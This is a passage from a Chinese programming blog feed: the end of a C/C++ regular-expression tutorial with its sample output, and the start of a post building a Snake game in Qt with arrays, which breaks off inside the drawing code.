class="hljs-keyword">if</span>(pm[i].rm_so==<span class="hljs-number">-1</span>)&#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-comment">//rm_so:匹配子字符串的开始</span><br>                <span class="hljs-comment">//rm_eo:匹配子字符串的结束</span><br>                <span class="hljs-comment">//rm_eo-rm_so:表示匹配的字符串的长度</span><br>                <span class="hljs-comment">//可参考:http://pubs.opengroup.org/onlinepubs/7908799/xsh/regex.h.html</span><br>                <span class="hljs-comment">//cout&lt;&lt;pm[i].rm_so&lt;&lt;&quot;\t&quot;&lt;&lt;pm[i].rm_eo&lt;&lt;endl;</span><br>                <span class="hljs-keyword">int</span> matchcount=pm[i].rm_eo-pm[i].rm_so;<br>                <span class="hljs-keyword">char</span> matchvalue[<span class="hljs-number">20</span>+<span class="hljs-number">1</span>];<br>                <span class="hljs-built_in">bzero</span>(matchvalue,<span class="hljs-number">21</span>);<br>                <span class="hljs-comment">//从匹配到的子字符串索引拷贝内容</span><br>                <span class="hljs-built_in">memcpy</span>(matchvalue,src+pm[i].rm_so,matchcount);<br>                matchvalue[<span class="hljs-built_in">strlen</span>(matchvalue)]=<span class="hljs-string">&#x27;\0&#x27;</span>;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---&gt;%s\n&quot;</span>,matchvalue);<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">char</span> errmsg[<span class="hljs-number">250</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">regerror</span>(ret,&amp;r,errmsg,<span class="hljs-number">250</span>);<br>            cout&lt;&lt;<span class="hljs-string">&quot;Message:&quot;</span>&lt;&lt;errmsg&lt;&lt;endl;<br>        &#125;<br>        <span class="hljs-comment">//释放内存</span><br>        <span class="hljs-built_in">regfree</span>(&amp;r);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//c++语言正则表达式替换</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">cppRegex_replace</span><span class="hljs-params">()</span></span>&#123;<br>    string tx=<span class="hljs-string">&quot;https://www.baidu.com&quot;</span>;<br>    cout&lt;&lt;<span class="hljs-string">&quot;old text:&quot;</span>&lt;&lt;tx.<span class="hljs-built_in">c_str</span>()&lt;&lt;endl;<br>    <span class="hljs-comment">//替换</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-function">regex <span class="hljs-title">re</span><span class="hljs-params">(<span class="hljs-string">&quot;\\bbaidu\\b&quot;</span>)</span></span>;<br>        tx=<span class="hljs-built_in">regex_replace</span>(tx,re,<span class="hljs-string">&quot;google&quot;</span>);<br>        cout&lt;&lt;<span class="hljs-string">&quot;new text:&quot;</span>&lt;&lt;tx.<span class="hljs-built_in">c_str</span>()&lt;&lt;endl;<br>    &#125;<span class="hljs-built_in"><span class="hljs-keyword">catch</span></span> (regex_error &amp;e)&#123;<br>        <span class="hljs-keyword">if</span>(e.<span class="hljs-built_in">code</span>()==regex_constants::error_badrepeat)&#123;<br>            <span class="hljs-comment">//do something...</span><br>        &#125;<br>        cout&lt;&lt;<span class="hljs-string">&quot;code:&quot;</span>&lt;&lt;e.<span class="hljs-built_in">code</span>()&lt;&lt;endl<br>            &lt;&lt;<span class="hljs-string">&quot;msg:&quot;</span>&lt;&lt;e.<span class="hljs-built_in">what</span>()&lt;&lt;endl;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//c++语言形式的正则表达式</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">cppRegex</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     *检测是否为正确的邮箱格式*/</span><br>    string pattern=<span class="hljs-string">&quot;^\\w&#123;2,20&#125;@\\w&#123;2,&#125;.com$&quot;</span>;<br>    string text=<span class="hljs-string">&quot;josephxrays@qq.com&quot;</span>;<br>    <span class="hljs-function">regex <span class="hljs-title">re</span><span class="hljs-params">(pattern,</span></span><br><span class="hljs-params"><span class="hljs-function">             std::regex_constants::icase|</span></span><br><span class="hljs-params"><span class="hljs-function">             std::regex_constants::extended|</span></span><br><span class="hljs-params"><span class="hljs-function">             regex_constants::ECMAScript)</span></span>;<br>    match_results&lt;string::const_iterator&gt; res;<br>    <span class="hljs-comment">//smatch res;</span><br>    <span class="hljs-keyword">bool</span> is=<span class="hljs-built_in">regex_match</span>(text,res,re);<br>    <span class="hljs-comment">//is=regex_search(text,res,re);</span><br>    <span class="hljs-keyword">if</span>(is==<span class="hljs-literal">true</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ok ,this is a true email format :)\n&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error email format :(\n&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//c++语言形式的正则表达式2</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">cppRegex_matchGroup</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     *检测是否为正确的邮箱格式*/</span><br>    string pattern=<span class="hljs-string">&quot;(.*?)@(.*?)\\.(.*?)&quot;</span>;<br>    string text=<span class="hljs-string">&quot;josephxrays@163.com&quot;</span>;<br>    <span class="hljs-function">regex <span class="hljs-title">re</span><span class="hljs-params">(pattern,</span></span><br><span class="hljs-params"><span class="hljs-function">             std::regex_constants::icase|<span class="hljs-comment">//忽略大小写</span></span></span><br><span class="hljs-params"><span class="hljs-function">             std::regex_constants::extended|</span></span><br><span class="hljs-params"><span class="hljs-function">             regex_constants::ECMAScript)</span></span>;<br>    match_results&lt;string::const_iterator&gt; res;<br>    <span class="hljs-comment">//smatch res;</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//bool is=regex_search(text,res,re);</span><br>        <span class="hljs-keyword">bool</span> is=<span class="hljs-built_in">regex_match</span>(text,res,re);<br>        <span class="hljs-keyword">if</span>(is==<span class="hljs-literal">true</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ok :)\n&quot;</span>);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; res.<span class="hljs-built_in">size</span>(); i++) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;--&gt;%s \n&quot;</span>,res.<span class="hljs-built_in">str</span>(i).<span class="hljs-built_in">c_str</span>());<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;no match :(\n&quot;</span>);<br>        &#125;<br>    &#125;<span class="hljs-built_in"><span class="hljs-keyword">catch</span></span> (regex_error &amp;e)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;exception:( \n \t %d \t %s\n&quot;</span>,e.<span class="hljs-built_in">code</span>(),e.<span class="hljs-built_in">what</span>());<br>    &#125;<br>&#125;<br><span class="hljs-comment">//c++语言形式的正则表达式3</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">cppRegex_matchGroup_iterator</span><span class="hljs-params">()</span></span>&#123;<br>    string pattern=<span class="hljs-string">&quot;&lt;a href=\&quot;(.*?)\&quot;&gt;(.*?)&lt;/a&gt;&quot;</span>;<br>    string text=<br>            <span class="hljs-string">&quot;&lt;a href=\&quot;https://www.baidu.com\&quot;&gt;百度&lt;/a&gt;&quot;</span>\<br>            <span class="hljs-string">&quot;&lt;a href=\&quot;https://www.google.com\&quot;&gt;谷歌&lt;/a&gt;&quot;</span>\<br>            <span class="hljs-string">&quot;&lt;a href=\&quot;http://www.csdn.net\&quot;&gt;CSDN&lt;/a&gt;&quot;</span>;<br>    <span class="hljs-function">regex <span class="hljs-title">re</span><span class="hljs-params">(pattern,</span></span><br><span class="hljs-params"><span class="hljs-function">             std::regex_constants::icase|</span></span><br><span class="hljs-params"><span class="hljs-function">             std::regex_constants::extended|</span></span><br><span class="hljs-params"><span class="hljs-function">             regex_constants::ECMAScript)</span></span>;<br>    <span class="hljs-comment">//regex_iterator 匹配所有子串</span><br>    <span class="hljs-function">sregex_iterator <span class="hljs-title">its</span><span class="hljs-params">(text.begin(),text.end(),re)</span></span>;<br>    sregex_iterator ends;<br>    <span class="hljs-keyword">while</span> (its!=ends)&#123;<br>        <span class="hljs-comment">//match_results&lt;T&gt;</span><br>        <span class="hljs-comment">//printf(&quot;%s \n&quot;,its-&gt;str(0).c_str());</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;--&gt;%s \t&quot;</span>,its-&gt;<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>).<span class="hljs-built_in">c_str</span>());<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s \n&quot;</span>,its-&gt;<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>).<span class="hljs-built_in">c_str</span>());<br>        its++;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">cRegex</span>();<br>    <span class="hljs-built_in">cppRegex</span>();<br>    <span class="hljs-built_in">cppRegex_matchGroup</span>();<br>    <span class="hljs-built_in">cppRegex_replace</span>();<br>    <span class="hljs-built_in">cppRegex_matchGroup_iterator</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>编译运行: <code>g++ main.cpp -o regex_test &amp;&amp; ./regex_test</code></p>
<p>输出结果:</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver"><span class="hljs-comment">---&gt;abcQQQQQQ-5555555xyz</span><br><span class="hljs-comment">---&gt;QQQQQQ</span><br><span class="hljs-comment">---&gt;5555555</span><br>ok ,this is <span class="hljs-keyword">a</span> truly email <span class="hljs-built_in">format</span> :)<br>ok :)<br><span class="hljs-comment">--&gt;josephxrays@163.com </span><br><span class="hljs-comment">--&gt;josephxrays </span><br><span class="hljs-comment">--&gt;163 </span><br><span class="hljs-comment">--&gt;com </span><br>old <span class="hljs-keyword">text</span>:<span class="hljs-keyword">https</span>://www.baidu.com<br><span class="hljs-built_in">new</span> <span class="hljs-keyword">text</span>:<span class="hljs-keyword">https</span>://www.google.com<br><span class="hljs-comment">--&gt;https://www.baidu.com 	百度 </span><br><span class="hljs-comment">--&gt;https://www.google.com 	谷歌 </span><br><span class="hljs-comment">--&gt;http://www.csdn.net 	CSDN</span><br></code></pre></div></td></tr></table></figure>
<p>bye~</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>Qt实现贪吃蛇1:数组实现</title>
    <url>/cpp-snake1/</url>
    <content><![CDATA[<h3 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h3>
<p>最近刚学了链表这一方面的内容，感觉挺强大的，正巧想起以前用数组写过一个贪吃蛇游戏代码，于是打算用两种方法实现它。方法为以下两种：</p>
<ul>
<li>数组</li>
<li>链表</li>
</ul>
<span id="more"></span>
<h3 id="正文"><a class="markdownIt-Anchor" href="#正文"></a> 正文</h3>
<p>其实，用数组实现贪吃蛇还算是比较简单的了，为什么？因为不用花太大功夫去考虑蛇身的每个节点之间的关系。同样，在实现蛇的游动、吃食、撞墙、吃到自己等功能时，最核心的部分我觉得是要弄清。</p>
<ul>
<li>其中 <code>void paintEvent(QPaintEvent *event)</code> 用来在每次重绘时绘制游戏布局、食物的位置、蛇的位置。分别用两个数组表示 <strong>食物的位置、蛇的位置</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">int</span> food[<span class="hljs-number">2</span>];<span class="hljs-comment">// food[0]表示 x坐标，food[1]表示 y坐标 </span><br><span class="hljs-keyword">int</span> snake[<span class="hljs-number">100</span>][<span class="hljs-number">2</span>]; <span class="hljs-comment">//同理，不过这里100相当于最多有100个蛇节点</span><br></code></pre></div></td></tr></table></figure>
<ul>
<li>接着，<code>void keyPressEvent(QKeyEvent * event)</code> 事件用来改变蛇运动的方向。我添加了一个枚举值</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">enum</span>  <span class="hljs-title">Direction</span>:</span><span class="hljs-keyword">int</span><br>&#123;<br>    East,<br>    South,<br>    West,<br>    North<br>&#125;;<br></code></pre></div></td></tr></table></figure>
<ul>
<li>由于蛇是自己移动的，所以还是创建一个时钟 <code>QTimer</code> 对象。</li>
<li>那么怎么判断蛇是否吃到食物呢，这里其实很简单，可以<strong>判断蛇头的x,y坐标是否与食物的x,y坐标相等即可</strong>，即<code>if(snake[0][0]==food[0]&amp;&amp;snake[0][1]==food[1])&#123;...&#125;</code></li>
<li>所以，检测是否撞到墙，也可以这样判断蛇头是否超过了边界 <code>if((snake[0][0]&lt;0||snake[0][1]&lt;0||snake[0][0]&gt;Columns-1||snake[0][1]&gt;Rows-1))&#123; ... &#125;</code></li>
<li>检测蛇是否吃到自己，可以 <strong>遍历每个蛇节点，判断蛇头 snake[0] 是否等于 某一个蛇身节点 snake[n] 即：蛇头在蛇的身上，表示吃到自己</strong></li>
</ul>
<p>好了，有了这些思路，那么就可以开始写代码了，可以创建一个Qt widget项目。<br />
代码如下：</p>
<p>dialog.h</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> DIALOG_H</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DIALOG_H</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;QDialog&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QPalette&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QPushButton&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QLabel&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QPainter&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QDebug&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QKeyEvent&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QTimer&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QTime&gt;</span></span><br><span class="hljs-keyword">namespace</span> Ui &#123;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Dialog</span>;</span><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Dialog</span> :</span> <span class="hljs-keyword">public</span> QDialog<br>&#123;<br>    Q_OBJECT<br><span class="hljs-keyword">public</span> slots:<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">timeOut</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">btnStartslot</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">btnPauseslot</span><span class="hljs-params">()</span></span>;<br><span class="hljs-keyword">protected</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">keyPressEvent</span><span class="hljs-params">(QKeyEvent *)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">paintEvent</span><span class="hljs-params">(QPaintEvent *event)</span></span>;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">Dialog</span><span class="hljs-params">(QWidget *parent = <span class="hljs-number">0</span>)</span></span>;<br>    ~<span class="hljs-built_in">Dialog</span>();<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">initialized</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">snakeRun</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">checkHItWall</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">checkEatSelf</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-class"><span class="hljs-keyword">enum</span>  <span class="hljs-title">Direction</span>:</span><span class="hljs-keyword">int</span>&#123;<br>        East,<br>        South,<br>        West,<br>        North<br>    &#125;;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-keyword">int</span> food[<span class="hljs-number">2</span>];<span class="hljs-comment">//食物坐标</span><br>    <span class="hljs-keyword">int</span> snake[<span class="hljs-number">100</span>][<span class="hljs-number">2</span>];<span class="hljs-comment">//蛇坐标</span><br>    <span class="hljs-keyword">int</span> eatfoodCount;<span class="hljs-comment">//吃到的食物总数</span><br>    <span class="hljs-keyword">int</span> directtion;<span class="hljs-comment">//蛇头方向</span><br>    <span class="hljs-keyword">int</span> scores;<span class="hljs-comment">//得分</span><br>    <span class="hljs-keyword">int</span> speed;<span class="hljs-comment">//蛇移动速度</span><br>    QLabel *lbScroe;<br>    QTimer *timer;<br>    Ui::Dialog *ui;<br>&#125;;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> <span class="hljs-comment">// DIALOG_H</span></span><br></code></pre></div></td></tr></table></figure>
<p>dialog.cpp</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;dialog.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;ui_dialog.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QMessageBox&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> Columns 20 <span class="hljs-comment">//20列</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> Rows 20  <span class="hljs-comment">//20行</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Dialog::timeOut</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">snakeRun</span>();<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Dialog::btnStartslot</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    timer-&gt;<span class="hljs-built_in">start</span>();<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Dialog::btnPauseslot</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    timer-&gt;<span class="hljs-built_in">stop</span>();<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Dialog::keyPressEvent</span><span class="hljs-params">(QKeyEvent * event)</span></span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-keyword">if</span>(event-&gt;<span class="hljs-built_in">key</span>()==<span class="hljs-string">&#x27;A&#x27;</span>)&#123;<br>            <span class="hljs-keyword">if</span>(directtion!=West)&#123;<br>                 directtion=East;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(event-&gt;<span class="hljs-built_in">key</span>()==<span class="hljs-string">&#x27;D&#x27;</span>)&#123;<br>           <span class="hljs-keyword">if</span>(directtion!=East)&#123;<br>                directtion=West;<br>           &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(event-&gt;<span class="hljs-built_in">key</span>()==<span class="hljs-string">&#x27;W&#x27;</span>)&#123;<br>            <span class="hljs-keyword">if</span>(directtion!=South)&#123;<br>                directtion=North;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(event-&gt;<span class="hljs-built_in">key</span>()==<span class="hljs-string">&#x27;S&#x27;</span>)&#123;<br>            <span class="hljs-keyword">if</span>(directtion!=North)&#123;<br>                directtion=South;<br>            &#125;<br>        &#125;<br>&#125;<br><span class="hljs-comment">///</span><br><span class="hljs-comment">/// \brief Dialog::paintEvent</span><br><span class="hljs-comment">/// \param event</span><br><span class="hljs-comment">/// 绘图事件主要负责 绘制 蛇</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Dialog::paintEvent</span><span class="hljs-params">(QPaintEvent *event)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-function">QPainter <span class="hljs-title">painter</span><span class="hljs-params">(<span class="hljs-keyword">this</span>)</span></span>;<br>    QPen pen;<br>    pen.<span class="hljs-built_in">setColor</span>(<span class="hljs-built_in">QColor</span>(Qt::darkGray));<br>    painter.<span class="hljs-built_in">setPen</span>(pen);<br>    <span class="hljs-comment">//绘制游戏布局</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> row = <span class="hljs-number">0</span>; row &lt; Rows; ++row) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> column = <span class="hljs-number">0</span>; column &lt; Columns; ++column) &#123;<br>            painter.<span class="hljs-built_in">drawRect</span>(row*<span class="hljs-number">20</span>,column*<span class="hljs-number">20</span>,<span class="hljs-number">20</span>,<span class="hljs-number">20</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//绘制食物</span><br>    painter.<span class="hljs-built_in">fillRect</span>(food[<span class="hljs-number">0</span>]*<span class="hljs-number">20</span>,food[<span class="hljs-number">1</span>]*<span class="hljs-number">20</span>,<span class="hljs-number">20</span>,<span class="hljs-number">20</span>,Qt::red);<br>    <span class="hljs-comment">//绘制蛇头</span><br>    painter.<span class="hljs-built_in">fillRect</span>(snake[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*<span class="hljs-number">20</span>,snake[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]*<span class="hljs-number">20</span>,<span class="hljs-number">20</span>,<span class="hljs-number">20</span>,Qt::green);<br>    <span class="hljs-comment">//根据食物的多少来绘制蛇身大长度</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> snakeBody = <span class="hljs-number">1</span>; snakeBody &lt;= eatfoodCount; snakeBody++) &#123;<br>        painter.<span class="hljs-built_in">fillRect</span>(snake[snakeBody][<span class="hljs-number">0</span>]*<span class="hljs-number">20</span>,snake[snakeBody][<span class="hljs-number">1</span>]*<span class="hljs-number">20</span>,<span class="hljs-number">20</span>,<span class="hljs-number">20</span>,<span class="hljs-built_in">QColor</span>(<span 